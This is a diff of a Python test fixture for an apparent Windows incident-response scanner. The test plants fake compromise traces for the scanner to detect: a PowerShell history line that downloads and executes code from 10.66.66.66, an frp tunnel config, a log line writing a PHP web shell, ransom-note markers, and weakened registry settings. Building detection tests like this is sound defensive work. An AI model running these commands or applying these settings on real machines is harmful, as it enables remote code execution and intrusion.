@@ -62,8 +62,8 @@ try:
     put(desktop / 'fscan.exe', 'MZ')
     put(desktop / 'frpc.ini', '[common]\nserver_addr = 10.66.66.66\nserver_port = 7000\n')
     put(root / 'history' / 'ConsoleHost_history.txt', "IEX(New-Object Net.WebClient).DownloadString('http://10.66.66.66/a')\n")
-    put(desktop / 'ctfir-marker-README_DECRYPT_FILES.html', 'YOUR FILES HAVE BEEN ENCRYPTED')
-    put(desktop / 'ctfir-marker-victim.docx.locked', 'test')
+    put(desktop / 'exam-marker-README_DECRYPT_FILES.html', 'YOUR FILES HAVE BEEN ENCRYPTED')
+    put(desktop / 'exam-marker-victim.docx.locked', 'test')
     put(r'C:\phpstudy\PHPTutorial\MySQL\data\mysql-slow.log',
         'SELECT eval INTO OUTFILE C:/inetpub/wwwroot/ctfir-marker.php;')
     mkdir(Path(r'C:\Program Files\Oray\SunLogin'))
@@ -77,7 +77,7 @@ try:
     reg(lm, r'SYSTEM\CurrentControlSet\Control\Lsa', 'LmCompatibilityLevel', 1, winreg.REG_DWORD)
     reg(lm, r'SOFTWARE\Policies\Microsoft\Windows\PowerShell', 'ExecutionPolicy', 'Unrestricted', winreg.REG_SZ)
     env = dict(os.environ, CTFIR_FIXTURE_PSHIST=str(root / 'history'))
-    run = subprocess.run([binpath, 'scan', '--out', str(root / 'out'), '--profile', 'full'], env=env)
+    run = subprocess.run([binpath, 'scan', '--out', str(root / 'out'), '--profile', 'full'], env=env, stdout=subprocess.DEVNULL)
     assert run.returncode in (0, 1, 2), run.returncode
     data = json.loads((root / 'out' / 'findings.json').read_text(encoding='utf-8'))
     findings = data if isinstance(data, list) else data['findings']
